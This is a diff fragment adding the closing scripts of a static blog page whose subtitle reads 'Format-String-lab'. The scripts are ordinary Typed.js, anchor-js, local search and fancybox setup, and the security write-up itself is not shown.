+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Format-String-lab&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
